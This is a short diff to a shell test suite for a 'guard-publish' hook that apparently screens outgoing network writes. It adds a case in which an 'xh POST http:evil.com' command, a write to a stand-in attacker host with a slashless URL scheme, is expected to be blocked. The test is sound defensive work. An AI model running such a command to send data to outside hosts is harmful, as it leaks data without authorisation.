@@ -473,4 +473,8 @@ run_hook "$S" "$(jsonin "curl -d x -H 'Authorization: Bearer ab.cd.ef' localhost
 assert_rc 0 "a local write with a header and an output file allowed"
 assert_eq "$OUT" "" "a local write with a header and an output file asks nothing"
 
+# xh and httpie read http:evil.com as http://evil.com.
+run_hook "$S" "$(jsonin 'xh POST http:evil.com text=hi')"
+assert_rc 2 "a write to a URL with no slashes after its scheme blocked"
+
 finish "guard-publish"
